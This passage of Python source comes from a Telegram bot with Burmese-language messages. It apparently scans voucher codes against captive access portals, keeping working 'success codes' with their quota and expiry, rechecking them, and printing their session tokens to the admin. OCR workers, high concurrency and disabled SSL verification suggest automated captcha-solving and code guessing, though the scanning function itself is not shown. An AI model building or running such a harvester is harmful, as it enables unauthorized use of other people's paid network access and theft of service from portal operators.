    cid = m.chat.id
    suc = success_texts.get(cid, []); lim = limited_texts.get(cid, [])
    if not suc and not lim:
        await bot.reply_to(m, "ရှာတွေ့ထားသော code မရှိ။"); return
    parts = []
    if suc:
        parts.append(f"✅ **Success Codes** ({len(suc)})")
        for it in suc:
            line = f"`{escape_md(it['code'])}` – ⏳ {escape_md(str(it.get('plan','N/A')))}"
            if it.get('usage') and it['usage'] != 'N/A': line += f"\n   📊 Usage: {escape_md(it['usage'])}"
            if it.get('quota') and it['quota'] != 'N/A': line += f"\n   💾 Quota: {escape_md(it['quota'])}"
            if it.get('expire') and it['expire'] != 'N/A': line += f"\n   📅 Expire: {escape_md(it['expire'])}"
            if it.get('portal'): line += f"\n   🌐 Portal: {escape_md(it['portal'])}"
            parts.append(line); parts.append("")
    if lim:
        parts.append(f"\n⚠️ **Limited Codes** ({len(lim)})")
        parts.extend(escape_md(c) for c in lim)
    txt = "\n".join(parts)
    MAX = 4096
    if len(txt) > MAX:
        for i in range(0, len(txt), MAX):
            try: await bot.send_message(cid, txt[i:i+MAX], parse_mode="Markdown")
            except Exception: await bot.send_message(cid, txt[i:i+MAX])
    else:
        try: await bot.reply_to(m, txt, parse_mode="Markdown")
        except Exception: await bot.reply_to(m, txt)

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(m):
    cid = m.chat.id
    for d in (success_texts, limited_texts, success_messages, limited_messages):
        d.pop(cid, None)
    try:
        results, sha = await get_file_content("result.json")
        if sha and str(cid) in results:
            del results[str(cid)]
            await update_file_content("result.json", results, sha, f"Clear {cid}")
    except Exception as e:
        safe_log(f"[delete] {e}")
    await bot.reply_to(m, "🗑️ ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(m):
    cid = m.chat.id
    notify_setting[cid] = not notify_setting.get(cid, DEFAULT_NOTIFY)
    await bot.reply_to(m, f"Notify: {'ON' if notify_setting[cid] else 'OFF'}")

@bot.message_handler(commands=['recheck'])
async def recheck(m):
    cid = m.chat.id
    if cid not in user_data:
        await bot.reply_to(m, "/setup ဖြင့် URL ထည့်ပါ။"); return
    suc = success_texts.get(cid, [])
    if not suc:
        await bot.reply_to(m, "Recheck လုပ်ရန် code မရှိ။"); return
    await bot.reply_to(m, "ပြန်စစ်နေပါသည်...")
    new = []
    for it in suc:
        r = await perform_check(user_data[cid]['session_url'], it["code"], cid, recheck=True, message=m,
                                version=user_data[cid].get('version', 'v1'))
        if r: new.append(it)
    if new:
        success_texts[cid] = new
        txt = "\n".join(escape_md(i['code']) for i in new)
        await bot.reply_to(m, f"✅ ကျန်သော codes:\n{txt}")
    else:
        success_texts[cid] = []
        await bot.reply_to(m, "အားလုံး မကျန်တော့ပါ။")

@bot.message_handler(commands=['status'])
async def status_cmd(m):
    if str(m.chat.id) != str(ADMIN_ID):
        await bot.reply_to(m, "No Permission"); return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up = int(time.monotonic() - _start_time)
    h, r = divmod(up, 3600); mn, s = divmod(r, 60)
    await bot.reply_to(m,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {h}h {mn}m {s}s\n"
        f"🔍 Active Scans: {active}\n"
        f"👥 Sessions: {len(user_data)}\n"
        f"⚡ Concurrency: {CONCURRENCY}\n"
        f"🧠 OCR Workers: {OCR_WORKERS}\n"
        f"📦 Batch: {BATCH_SIZE}\n"
        f"🌐 Default Portal: {DEFAULT_PORTAL}")

@bot.message_handler(commands=['testbalance'])
async def testbalance(m):
    if str(m.chat.id) != str(ADMIN_ID):
        await bot.reply_to(m, "No Permission"); return
    cid = m.chat.id
    targets = []
    for c, items in success_texts.items():
        for it in items:
            targets.append({"code": it["code"], "token": it.get("token") or it.get("session_id"),
                            "portal": it.get("portal", DEFAULT_PORTAL)})
    if not targets:
        await bot.reply_to(m, "⚠️ မရှိသေးပါ။"); return
    await bot.reply_to(m, f"🔍 Testing {len(targets)} code(s)...")
    for t in targets[:3]:
        pc = PORTAL_CONFIGS.get(t["portal"], PORTAL_CONFIGS[DEFAULT_PORTAL])
        version = "v1"
        for cid, ud in user_data.items():
            if ud.get('portal_type') == t["portal"]:
                version = ud.get('version', 'v1')
                break
        bi = await get_balance(t["token"], pc, version)
        r = (f"🎯 Code: `{escape_md(t['code'])}`\n"
             f"🔑 Token: `{escape_md(t['token'])}`\n"
             f"🌐 Portal: {escape_md(t['portal'])}\n"
             f"📌 Version: {version}\n"
             f"⏳ Time: {escape_md(bi.get('time','N/A'))}\n"
             f"📊 Usage: {escape_md(bi.get('usage','N/A'))}\n"
             f"💾 Quota: {escape_md(bi.get('quota','N/A'))}\n"
             f"📋 Plan: {escape_md(bi.get('plan','N/A'))}\n"
             f"📅 Expire: {escape_md(bi.get('expire','N/A'))}")
        try: await bot.send_message(cid, r, parse_mode="Markdown")
        except Exception: await bot.send_message(cid, r)

# ── Polling + main ────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            safe_log(f"Polling error: {e}, retry in {backoff}s")
            await asyncio.sleep(backoff); backoff = min(backoff*2, 60)
        except Exception as e:
            safe_log(f"Polling err: {e}, retry in {backoff}s")
            await asyncio.sleep(backoff); backoff = min(backoff*2, 60)

async def main():
    global session, _connector, _voucher_sem, _rate_limiter, _ocr_executor

    _connector = aiohttp.TCPConnector(
        limit=CONCURRENCY * 2,
        limit_per_host=CONCURRENCY,
        ttl_dns_cache=300,
        keepalive_timeout=60,
        enable_cleanup_closed=True,
        ssl=False,
    )
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    _rate_limiter = AsyncLimiter(RATE_PER_SEC, 1)
    _ocr_executor = ThreadPoolExecutor(max_workers=OCR_WORKERS, thread_name_prefix="ocr_")

    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector,
        connector_owner=False,
    )
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        safe_log(f"🚀 Starting bot | CONCURRENCY={CONCURRENCY} OCR_WORKERS={OCR_WORKERS} BATCH={BATCH_SIZE} RATE={RATE_PER_SEC}/s")
        await start_polling()
    finally:
        await session.close()
        await _connector.close()
        _ocr_executor.shutdown(wait=False)

if __name__ == '__main__':
    asyncio.run(main())
